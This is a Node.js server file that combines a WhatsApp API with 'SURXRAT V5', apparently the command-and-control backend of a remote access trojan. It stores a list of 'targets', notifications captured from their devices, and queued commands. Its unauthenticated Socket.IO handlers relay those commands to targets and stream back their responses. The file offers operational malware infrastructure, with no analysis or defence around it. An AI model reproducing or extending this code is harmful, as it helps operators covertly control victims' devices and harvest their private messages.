const http = require('http');
const socketIo = require('socket.io');
const app = require('./src/app');
const { setIO } = require('./src/routes/suxrat');
const { PORT } = require('./src/utils/constants');
const { startUserSessions } = require('./src/services/whatsappService');
const { startTelegramBot } = require('./src/services/telegramService');
const fs = require('fs');
const path = require('path');

// Create HTTP server with Socket.IO
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// Set IO instance for suxrat routes
setIO(io);

// SURXRAT Database files
const TARGETS_FILE = path.join(__dirname, 'src/data/suxrat/targets.json');
const NOTIF_FILE = path.join(__dirname, 'src/data/suxrat/notifications.json');
const COMMANDS_FILE = path.join(__dirname, 'src/data/suxrat/commands.json');
const RESPONSES_FILE = path.join(__dirname, 'src/data/suxrat/responses.json');

const readData = (file) => {
  if (!fs.existsSync(file)) return [];
  try {
    const content = fs.readFileSync(file, 'utf8');
    return JSON.parse(content || '[]');
  } catch (e) { return []; }
};

const saveData = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// Socket.IO connection handler for SURXRAT realtime events
io.on('connection', (socket) => {
  console.log(`[SOCKET] Client connected: ${socket.id}`);
  
  // Join suxrat room for realtime updates
  socket.on('join-suxrat', () => {
    socket.join('suxrat');
    console.log(`[SOCKET] Client ${socket.id} joined suxrat room`);
    socket.emit('suxrat-connected', { message: 'Connected to SURXRAT realtime events' });
  });

  // Realtime target updates
  socket.on('update-target', (data) => {
    const targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === data.id);
    if (index !== -1) {
      targets[index] = { ...targets[index], ...data, lastSeen: new Date() };
      saveData(TARGETS_FILE, targets);
      io.to('suxrat').emit('target-updated', { id: data.id, status: 'Online' });
    }
  });

  // Realtime notification listener
  socket.on('listen-notifications', (targetId) => {
    socket.join(`notif-${targetId}`);
    socket.emit('notifications-loaded', readData(NOTIF_FILE).filter(n => n.targetId === targetId));
  });

  // Realtime command execution
  socket.on('send-command', (data) => {
    const { id, command, extra } = data;
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    io.to('suxrat').emit('command-sent', { id, command });
  });

  // Realtime response listener
  socket.on('listen-responses', (targetId) => {
    socket.join(`response-${targetId}`);
  });

  socket.on('disconnect', () => {
    console.log(`[SOCKET] Client disconnected: ${socket.id}`);
  });
});

// Helper function to emit realtime events
function emitToSuxrat(event, data) {
  io.to('suxrat').emit(event, data);
}

// Start server
server.listen(PORT, () => {
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`    MERGED SERVER - WHATSAPP API + SURXRAT V5`);
  console.log(`    PORT   : ${PORT}                        `);
  console.log(`    STATUS : PERSISTENCE ACTIVE             `);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  console.log(`📱 WhatsApp API endpoints at /api/*`);
  console.log(`🎯 SURXRAT endpoints at /suxrat/api/*`);
  console.log(`🔌 Socket.IO ready for real-time events`);
  
  startUserSessions();
  startTelegramBot();
});

module.exports = { app, server, io, emitToSuxrat };